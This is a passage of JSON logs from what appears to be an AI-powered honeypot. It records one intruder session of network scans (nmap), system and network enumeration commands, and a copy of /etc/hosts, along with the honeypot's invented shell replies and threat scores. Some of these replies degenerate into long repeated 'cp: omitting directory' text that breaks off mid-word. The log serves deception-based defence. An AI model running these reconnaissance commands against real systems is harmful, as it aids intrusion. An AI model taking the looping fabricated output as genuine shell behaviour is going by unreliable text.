        "threat_level": "HIGH",
        "base_score": 59,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 27,
            "unique_commands": 24,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 299,
            "commands_executed": 27,
            "successful_commands": 27,
            "failed_commands": 0,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 59,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:11:36,232 - {"session_id": "71dd20b2", "command": "ls -la /var/www", "attack_type": "System Enumeration", "risk_score": 59, "threat_level": "HIGH"}
2026-07-21 11:11:36,232 - {
    "session_id": "71dd20b2",
    "command": "ls -la /var/www",
    "ai_decision": "**WARNING: Accessing sensitive directory /var/www**\n\ndrwxr-xr-x  2 root root 4096 Jun 15 14:30 .\ndrwxr-xr-x 19 root root 4096 Jun 15 14:30 ..\n-rw-r--r--  1 root root  220 Jun 15 14:30 clients.json\n-rw-r--r--  1 root root  220 Jun 15 14:30 vendors.json\n-rw-r--r--  1 root root  220 Jun 15 14:30 infrastructure_assets.yaml\n-rw-r--r--  1 root root  220 Jun 15 14:30 db_backup.sql\n-rw-r--r--  1 root root  220 Jun 15 14:30 dev_tasks.md\ndrwxr-xr-x  2 root root 4096 Jun 15 14:30 internal\ndrwxr-xr-x  2 root root 4096 Jun 15 14:30 html\ndrwxr-xr-x  2 root root 4096 Jun 15 14:30 uploads\n**SECURITY NOTICE: Be cautious when accessing sensitive data in /var/www**",
    "confidence_score": 0.85,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 27
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.85
    },
    "risk_score": 59,
    "threat_level": "HIGH"
}
2026-07-21 11:11:36,232 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: ls -la /var/www",
    "ai_decision": "**WARNING: Accessing sensitive directory /var/www**\n\ndrwxr-xr-x  2 root root 4096 Jun 15 14:30 .\ndrwxr-xr-x 19 root root 4096 Jun 15 14:30 ..\n-rw-r--r--  1 root root  220 Jun 15 14:30 clients.json\n-rw-r--r--  1 root root  220 Jun 15 14:30 vendors.json\n-rw-r--r--  1 root root  220 Jun 15 14:30 infrastructure_assets.yaml\n-rw-r--r--  1 root root  220 Jun 15 14:30 db_backup.sql\n-rw-r--r--  1 root root  220 Jun 15 14:30 dev_tasks.md\ndrwxr-xr-x  2 root root 4096 Jun 15 14:30 internal\ndrwxr-xr-x  2 root root 4096 Jun 15 14:30 html\ndrwxr-xr-x  2 root root 4096 Jun 15 14:30 uploads\n**SECURITY NOTICE: Be cautious when accessing sensitive data in /var/www**",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "System Enumeration",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:11:36,296 - {
    "session_id": "71dd20b2",
    "query": "mkdir /tmp/test",
    "response": "None",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 60,
        "risk_level": "HIGH",
        "final_score": 60,
        "threat_level": "HIGH",
        "base_score": 60,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 28,
            "unique_commands": 25,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 312,
            "commands_executed": 28,
            "successful_commands": 27,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 60,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:11:36,296 - {"session_id": "71dd20b2", "command": "mkdir /tmp/test", "attack_type": "Unknown", "risk_score": 60, "threat_level": "HIGH"}
2026-07-21 11:11:36,296 - {
    "session_id": "71dd20b2",
    "command": "mkdir /tmp/test",
    "ai_decision": "None",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 28
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 60,
    "threat_level": "HIGH"
}
2026-07-21 11:11:36,297 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: mkdir /tmp/test",
    "ai_decision": "None",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:11:52,260 - {
    "session_id": "71dd20b2",
    "query": "cd /tmp",
    "response": "Warning: Directory changed to /tmp\n\ntmp/  tmpfile \n\n-rw-r--r-- 1 ubuntu ubuntu 0 Jul 21 14:34 tmpfile \n\nWARNING: Temporary files in /tmp may be deleted on reboot.",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 61,
        "risk_level": "HIGH",
        "final_score": 61,
        "threat_level": "HIGH",
        "base_score": 61,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 29,
            "unique_commands": 26,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 312,
            "commands_executed": 29,
            "successful_commands": 28,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 61,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:11:52,260 - {"session_id": "71dd20b2", "command": "cd /tmp", "attack_type": "Unknown", "risk_score": 61, "threat_level": "HIGH"}
2026-07-21 11:11:52,260 - {
    "session_id": "71dd20b2",
    "command": "cd /tmp",
    "ai_decision": "Warning: Directory changed to /tmp\n\ntmp/  tmpfile \n\n-rw-r--r-- 1 ubuntu ubuntu 0 Jul 21 14:34 tmpfile \n\nWARNING: Temporary files in /tmp may be deleted on reboot.",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 29
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 61,
    "threat_level": "HIGH"
}
2026-07-21 11:11:52,260 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: cd /tmp",
    "ai_decision": "Warning: Directory changed to /tmp\n\ntmp/  tmpfile \n\n-rw-r--r-- 1 ubuntu ubuntu 0 Jul 21 14:34 tmpfile \n\nWARNING: Temporary files in /tmp may be deleted on reboot.",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:11:57,792 - {
    "session_id": "71dd20b2",
    "query": "touch /tmp/testfile.txt",
    "response": "Warning: File created in /tmp directory. This directory is not monitored for security purposes.\n\ntouch: creating `/tmp/testfile.txt'\n\n-rw-r--r-- 1 ubuntu ubuntu 0 Jul 21 14:34 /tmp/testfile.txt",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 62,
        "risk_level": "HIGH",
        "final_score": 62,
        "threat_level": "HIGH",
        "base_score": 62,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 30,
            "unique_commands": 27,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 328,
            "commands_executed": 30,
            "successful_commands": 29,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 62,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:11:57,792 - {"session_id": "71dd20b2", "command": "touch /tmp/testfile.txt", "attack_type": "Unknown", "risk_score": 62, "threat_level": "HIGH"}
2026-07-21 11:11:57,792 - {
    "session_id": "71dd20b2",
    "command": "touch /tmp/testfile.txt",
    "ai_decision": "Warning: File created in /tmp directory. This directory is not monitored for security purposes.\n\ntouch: creating `/tmp/testfile.txt'\n\n-rw-r--r-- 1 ubuntu ubuntu 0 Jul 21 14:34 /tmp/testfile.txt",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 30
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 62,
    "threat_level": "HIGH"
}
2026-07-21 11:11:57,792 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: touch /tmp/testfile.txt",
    "ai_decision": "Warning: File created in /tmp directory. This directory is not monitored for security purposes.\n\ntouch: creating `/tmp/testfile.txt'\n\n-rw-r--r-- 1 ubuntu ubuntu 0 Jul 21 14:34 /tmp/testfile.txt",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:12:13,763 - {
    "session_id": "71dd20b2",
    "query": "cp /etc/hosts /tmp/hosts_bak",
    "response": "cp: `/etc/hosts' and `/tmp/hosts_bak' are the same file\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 63,
        "risk_level": "HIGH",
        "final_score": 63,
        "threat_level": "HIGH",
        "base_score": 63,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 31,
            "unique_commands": 28,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 334,
            "commands_executed": 31,
            "successful_commands": 30,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 63,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:12:13,763 - {"session_id": "71dd20b2", "command": "cp /etc/hosts /tmp/hosts_bak", "attack_type": "Unknown", "risk_score": 63, "threat_level": "HIGH"}
2026-07-21 11:12:13,763 - {
    "session_id": "71dd20b2",
    "command": "cp /etc/hosts /tmp/hosts_bak",
    "ai_decision": "cp: `/etc/hosts' and `/tmp/hosts_bak' are the same file\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 31
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 63,
    "threat_level": "HIGH"
}
2026-07-21 11:12:13,763 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: cp /etc/hosts /tmp/hosts_bak",
    "ai_decision": "cp: `/etc/hosts' and `/tmp/hosts_bak' are the same file\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting directory `/tmp/hosts_bak'\ncp: omitting directory `/etc/hosts'\ncp: omitting directory `/tmp'\ncp: omitting directory `/etc'\n\ncp: omitting",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:12:39,367 - {
    "session_id": "71dd20b2",
    "query": "mv /tmp/hosts_bak /tmp/hosts_new",
    "response": "[Guardrail] No valid response generated.",
    "selected_personality": {
        "name": "Suspicious Server",
        "hostname": "corp-internal-secure",
        "user": "sysadmin",
        "style": "suspicious",
        "description": "Cautious, alert, prints occasional warning banners",
        "response_style": "cautious, alert, prints occasional warning banners or security notices, returns slightly defensive output"
    },
    "threat_score": {
        "score": 64,
        "risk_level": "HIGH",
        "final_score": 64,
        "threat_level": "HIGH",
        "base_score": 64,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udfe0"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 32,
            "unique_commands": 29,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 350,
            "commands_executed": 32,
            "successful_commands": 31,
            "failed_commands": 1,
            "files_accessed": 0,
            "services_accessed": 0,
            "engagement_score": 70,
            "engagement_level": "MEDIUM"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 64,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
